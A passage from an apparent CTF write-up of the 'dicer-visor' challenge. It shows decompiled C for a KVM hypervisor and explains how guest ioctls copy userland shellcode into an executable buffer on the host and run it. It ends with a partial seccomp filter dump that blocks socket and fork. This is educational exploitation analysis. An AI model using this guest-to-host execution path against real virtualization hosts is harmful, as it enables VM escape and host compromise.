+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>run_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm);
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>cleanup_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc,<span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar2;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> vm vm;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdin,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stderr,(<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)<span style=color:#ae81ff>0x0</span>,<span style=color:#ae81ff>2</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>3</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>fwrite</span>(<span style=color:#e6db74>&#34;Usage: ./dicer-visor &lt;bzImage&gt; &lt;initrd&gt;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,<span style=color:#ae81ff>0x28</span>,<span style=color:#ae81ff>1</span>,stderr);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Dicer-visor - DiceGang Security Hypervisor&#34;</span>);
+</span></span><span style=display:flex><span>  vm.kvm_fd <span style=color:#f92672>=</span> <span style=color:#a6e22e>open</span>(<span style=color:#e6db74>&#34;/dev/kvm&#34;</span>,<span style=color:#ae81ff>0x80002</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (vm.kvm_fd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;/dev/kvm&#34;</span>);
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm.kvm_fd,KVM_GET_API_VERSION ,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xc</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>init_vm</span>(<span style=color:#f92672>&amp;</span>vm);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Created VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>load_vm</span>(<span style=color:#f92672>&amp;</span>vm,argv[<span style=color:#ae81ff>1</span>],argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*] Loaded kernel image: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>1</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[*] Loaded initrd image: %s</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>,argv[<span style=color:#ae81ff>2</span>]);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Starting up VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>run_vm</span>(<span style=color:#f92672>&amp;</span>vm);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>cleanup_vm</span>(<span style=color:#f92672>&amp;</span>vm.vm_fd);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[*] Exited VM&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;KVM_GET_API_VERSION %d, expected 12&#34;</span>,iVar1);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;KVM_GET_API_VERSION&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>/* WARNING: Could not reconcile some variable overlaps */</span>
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>init_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>userspace_addr;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>pcVar2;
+</span></span><span style=display:flex><span>  undefined8 local_70;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> kvm_userspace_memory_region kvm_userspace_memory_region;
+</span></span><span style=display:flex><span>  kvm_pit_config kvm_pit_config;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>kvm_fd,KVM_CREATE_VM ,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  vm<span style=color:#f92672>-&gt;</span>vm_fd <span style=color:#f92672>=</span> iVar1;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>    pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] VM creation failed&#34;</span>;
+</span></span><span style=display:flex><span>  } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>    iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(iVar1,KVM_SET_TSS_ADDR,<span style=color:#ae81ff>0xfffbd000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>      pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to set TSS addr&#34;</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>      local_70 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0xffffc000</span>;
+</span></span><span style=display:flex><span>      iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd,KVM_SET_IDENTITY_MAP_ADDR,<span style=color:#f92672>&amp;</span>local_70);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>        pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to set identity map addr&#34;</span>;
+</span></span><span style=display:flex><span>      } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>        iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd,KVM_CREATE_IRQCHIP,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>          pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to create irq chip&#34;</span>;
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>          kvm_pit_config.pad._44_16_ <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZEXT816</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          kvm_pit_config.pad._28_16_ <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZEXT816</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          kvm_pit_config.pad._12_16_ <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZEXT816</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          kvm_pit_config._0_16_ <span style=color:#f92672>=</span> <span style=color:#a6e22e>ZEXT816</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd,KVM_CREATE_PIT2,<span style=color:#f92672>&amp;</span>kvm_pit_config);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>            pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to create i8254 interval timer&#34;</span>;
+</span></span><span style=display:flex><span>          } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>            userspace_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>mmap</span>(NULL,<span style=color:#ae81ff>0x10000000</span>,<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>0x4021</span>,<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>            vm<span style=color:#f92672>-&gt;</span>userspace_address <span style=color:#f92672>=</span> userspace_addr;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (userspace_addr <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>              pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to mmap VM memory&#34;</span>;
+</span></span><span style=display:flex><span>            } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region._0_8_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100000000</span>;
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region.guest_phys_addr._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region.guest_phys_addr._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region.memory_size._0_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10000000</span>;
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region.memory_size._4_4_ <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>              kvm_userspace_memory_region.userspace_addr <span style=color:#f92672>=</span> (ulong)userspace_addr;
+</span></span><span style=display:flex><span>              iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd,KVM_SET_USER_MEMORY_REGION,<span style=color:#f92672>&amp;</span>kvm_userspace_memory_region);
+</span></span><span style=display:flex><span>              <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>                pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to set user memory region&#34;</span>;
+</span></span><span style=display:flex><span>              } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>                iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd,KVM_CREATE_VCPU,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>                vm<span style=color:#f92672>-&gt;</span>vcpu_fd <span style=color:#f92672>=</span> iVar1;
+</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>&lt;</span> iVar1) {
+</span></span><span style=display:flex><span>                  <span style=color:#a6e22e>initVMRegs</span>(vm);
+</span></span><span style=display:flex><span>                  <span style=color:#a6e22e>createCPUID</span>(vm);
+</span></span><span style=display:flex><span>                  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>                }
+</span></span><span style=display:flex><span>                pcVar2 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;[!] Failed to create vcpu&#34;</span>;
+</span></span><span style=display:flex><span>              }
+</span></span><span style=display:flex><span>            }
+</span></span><span style=display:flex><span>          }
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>,pcVar2);
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#f92672>*</span>jit_mem;
+</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> jit_mem_counter;
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>run_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm) {
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> iVar1;
+</span></span><span style=display:flex><span>  kvm_run <span style=color:#f92672>*</span>vcpu;
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>long</span> idx;
+</span></span><span style=display:flex><span>  undefined seccomp_filter[]; <span style=color:#75715e>//length omitted
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  ushort port;
+</span></span><span style=display:flex><span>  
+</span></span><span style=display:flex><span>  iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>kvm_fd,KVM_GET_VCPU_MMAP_SIZE,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  vcpu <span style=color:#f92672>=</span> (kvm_run <span style=color:#f92672>*</span>)<span style=color:#a6e22e>mmap</span>(NULL,iVar1,PROT_READ<span style=color:#f92672>|</span>PROT_WRITE,MAP_SHARED,vm<span style=color:#f92672>-&gt;</span>vcpu_fd,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  jit_mem <span style=color:#f92672>=</span> (code <span style=color:#f92672>*</span>)<span style=color:#a6e22e>mmap</span>(NULL,<span style=color:#ae81ff>0x100</span>,PROT_READ<span style=color:#f92672>|</span>PROT_WRITE<span style=color:#f92672>|</span>PROC_EXEC,
+</span></span><span style=display:flex><span>                         MAP_SHARED<span style=color:#f92672>|</span>MAP_ANONYMOUS<span style=color:#f92672>|</span>MAP_NORESERVE,<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>  );
+</span></span><span style=display:flex><span>  jit_mem_counter <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/* init seccomp_filter */</span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>/*       ...           */</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//Set seccomp filter
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>prctl</span>(PR_SET_NO_NEW_PRIVS,<span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;prctl(NO_NEW_PRIVS)&#34;</span>);
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>prctl</span>(PR_SET_SECCOMP,<span style=color:#ae81ff>2</span>,seccomp_filter);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>!=</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>vcpu_fd);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>kvm_fd);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>munmap</span>(vm<span style=color:#f92672>-&gt;</span>userspace_address,<span style=color:#ae81ff>0x40000000</span>);
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>perror</span>(<span style=color:#e6db74>&#34;prctl(SECCOMP)&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#75715e>//BUG? If the seccomp filter fails, then we still attempt to execute the remaining of this function.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#75715e>//But the file descriptors have been closed and memory has been unmapped. Oh well..
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#75715e>//run the VM
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vcpu_fd,KVM_RUN,<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span>( true ) {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (iVar1 <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>err</span>(<span style=color:#ae81ff>1</span>,<span style=color:#e6db74>&#34;kvm_run failed&#34;</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (vcpu<span style=color:#f92672>-&gt;</span>exit_reason <span style=color:#f92672>!=</span> KVM_EXIT_IO)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#75715e>/* union case: KVM_EXIT_IO */</span>
+</span></span><span style=display:flex><span>    port <span style=color:#f92672>=</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.port;  <span style=color:#75715e>//vcpu-&gt;unlabelled32.io.port
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> ((<span style=color:#66d9ef>short</span>)port <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0x61</span>) {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (port <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xd1ce</span>) {
+</span></span><span style=display:flex><span>        (<span style=color:#f92672>*</span>jit_mem)();
+</span></span><span style=display:flex><span>      } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> ((port <span style=color:#f92672>==</span> <span style=color:#ae81ff>0xdead</span>) <span style=color:#f92672>&amp;&amp;</span> (vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.direction <span style=color:#f92672>==</span> KVM_EXIT_IO_OUT)) {
+</span></span><span style=display:flex><span>        idx <span style=color:#f92672>=</span> (<span style=color:#66d9ef>long</span>)jit_mem_counter;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (idx <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>0x100</span>) { <span style=color:#75715e>//unintended off-by-one.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>          jit_mem_counter<span style=color:#f92672>++</span>;
+</span></span><span style=display:flex><span>          jit_mem[idx] <span style=color:#f92672>=</span> <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)vcpu <span style=color:#f92672>+</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.data_offset);
+</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;[!] Maximum bytes read from guest&#34;</span>);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (port <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x61</span> <span style=color:#f92672>&amp;&amp;</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.direction <span style=color:#f92672>==</span> KVM_EXIT_IO_IN) {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)vcpu <span style=color:#f92672>+</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.data_offset) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;d&#39;</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> (port <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x3fd</span> <span style=color:#f92672>&amp;&amp;</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.direction <span style=color:#f92672>==</span> KVM_EXIT_IO_IN) {
+</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>((<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)vcpu <span style=color:#f92672>+</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.data_offset) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39; &#39;</span>;
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span> ((port <span style=color:#f92672>==</span> <span style=color:#ae81ff>0x3f8</span>) <span style=color:#f92672>&amp;&amp;</span> (vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.direction <span style=color:#f92672>==</span> KVM_EXIT_IO_OUT)) {
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>write</span>(<span style=color:#ae81ff>1</span>, (<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span>)vcpu <span style=color:#f92672>+</span> vcpu<span style=color:#f92672>-&gt;</span>unlabelled32.io.data_offset, <span style=color:#ae81ff>1</span>);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    iVar1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>ioctl</span>(vm<span style=color:#f92672>-&gt;</span>vcpu_fd,KVM_RUN,<span style=color:#ae81ff>0</span>); <span style=color:#75715e>//continue the VM
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[!] Unknown Exit Reason: %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, vcpu<span style=color:#f92672>-&gt;</span>exit_reason);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>undefined8 <span style=color:#a6e22e>cleanup_vm</span>(<span style=color:#66d9ef>struct</span> vm <span style=color:#f92672>*</span>vm) {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>vcpu_fd);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>vm_fd);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>close</span>(vm<span style=color:#f92672>-&gt;</span>kvm_fd);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>munmap</span>(vm<span style=color:#f92672>-&gt;</span>userspace_address,<span style=color:#ae81ff>0x40000000</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The <code>run_vm</code> now is quite self-explanatory and interesting. As we recall from the <code>vuln.ko</code>, there were two <code>OUT</code> x86 instructions that we could invoke: <code>OUT(0xd1ce,0xd1ce)</code> and <code>OUT(0xdead,shellcode[i])</code>. From the hypervisor&rsquo;s code, we can see that when the <code>port</code> is <code>0xd1ce</code>, the contents of the <code>jit_mem</code> are executed. When the <code>port</code> is <code>0xdead</code>, we write to the <code>jit_mem</code> the value of the source operand from the <code>OUT</code> x86 instructions. So, to sum it up:</p><ul><li><code>write</code> syscall to the <code>/dev/exploited-device</code>: Writes up to <code>0x100</code> bytes to the kernel&rsquo;s <code>shellcode</code> buffer from a userland provided buffer.</li><li>ioctl cmd <code>0xdead</code>: <code>OUT(0xdead, shellcode[i])</code>. Writes the <code>0x100</code> bytes from the kernel&rsquo;s <code>shellcode</code> buffer to the hypervisor&rsquo;s <code>jit_mem</code>. May be called only once. (Otherwise you get the message &ldquo;Maximum bytes read from guest&rdquo;.)</li><li>ioctl cmd <code>0xbeef</code>: <code>OUT(0xd1ce,0xd1ce)</code>. Will execute the contents in the <code>jit_mem</code> buffer. i.e. It will execute the shellcode provided from userland.</li></ul><h3 id=seccomp-filter>seccomp filter</h3><p>One last thing to notice about <code>run_vm</code>, is that it sets up a seccomp filter. Using <a href=https://github.com/david942j/seccomp-tools>seccomp-tools</a>, we can easily dump it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>fane@ctf-box:~/dicer-visor$ seccomp-tools dump <span style=color:#e6db74>&#34;./dicer-visor bzImage initramfs.cpio.gz&#34;</span>
+</span></span><span style=display:flex><span>Dicer-visor - DiceGang Security Hypervisor
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Created VM
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded kernel image: bzImage
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Loaded initrd image: initramfs.cpio.gz
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting up VM
+</span></span><span style=display:flex><span> line  CODE  JT   JF      K
+</span></span><span style=display:flex><span><span style=color:#f92672>=================================</span>
+</span></span><span style=display:flex><span> 0000: 0x20 0x00 0x00 0x00000004  A <span style=color:#f92672>=</span> arch
+</span></span><span style=display:flex><span> 0001: 0x15 0x01 0x00 0xc000003e  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A <span style=color:#f92672>==</span> ARCH_X86_64<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0003</span>
+</span></span><span style=display:flex><span> 0002: 0x06 0x00 0x00 0x00000000  <span style=color:#66d9ef>return</span> KILL
+</span></span><span style=display:flex><span> 0003: 0x20 0x00 0x00 0x00000000  A <span style=color:#f92672>=</span> sys_number
+</span></span><span style=display:flex><span> 0004: 0x15 0x00 0x01 0x00000029  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> socket<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0006</span>
+</span></span><span style=display:flex><span> 0005: 0x06 0x00 0x00 0x80000000  <span style=color:#66d9ef>return</span> KILL_PROCESS
+</span></span><span style=display:flex><span> 0006: 0x15 0x00 0x01 0x00000039  <span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>A !<span style=color:#f92672>=</span> fork<span style=color:#f92672>)</span> goto <span style=color:#ae81ff>0008</span>
